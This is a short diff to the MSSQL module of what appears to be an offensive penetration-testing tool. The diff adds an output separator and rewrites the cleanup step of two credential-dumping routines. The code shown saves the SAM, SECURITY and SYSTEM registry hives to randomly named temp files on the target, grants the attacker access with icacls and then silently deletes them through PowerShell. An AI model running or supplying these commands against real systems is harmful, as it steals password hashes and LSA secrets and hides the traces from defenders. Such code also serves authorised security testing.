@@ -320,6 +320,7 @@ class mssql(connection):
                 self.logger.fail(self.conn.lastError)
             else:
                 for data in raw_output:
+                    self.logger.highlight("--------------------")
                     for key, value in data.items():
                         if key:
                             self.logger.highlight(f"{key}:{value}")
@@ -571,7 +572,8 @@ class mssql(connection):
         sam_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
-        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        # del must list C:\windows\temp, which the SQL service account may not be allowed to do; Remove-Item -LiteralPath does not need to
+        clean_command = f"powershell -NoProfile -Command Remove-Item -LiteralPath C:\\windows\\temp\\{sam_storename},C:\\windows\\temp\\{system_storename} -Force -ErrorAction SilentlyContinue"
         get_owner_command = f"icacls C:\\windows\\temp\\{sam_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="sam")
         try:
@@ -606,7 +608,8 @@ class mssql(connection):
         security_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
-        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        # del must list C:\windows\temp, which the SQL service account may not be allowed to do; Remove-Item -LiteralPath does not need to
+        clean_command = f"powershell -NoProfile -Command Remove-Item -LiteralPath C:\\windows\\temp\\{security_storename},C:\\windows\\temp\\{system_storename} -Force -ErrorAction SilentlyContinue"
         get_owner_command = f"icacls C:\\windows\\temp\\{security_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="lsa")
         try:
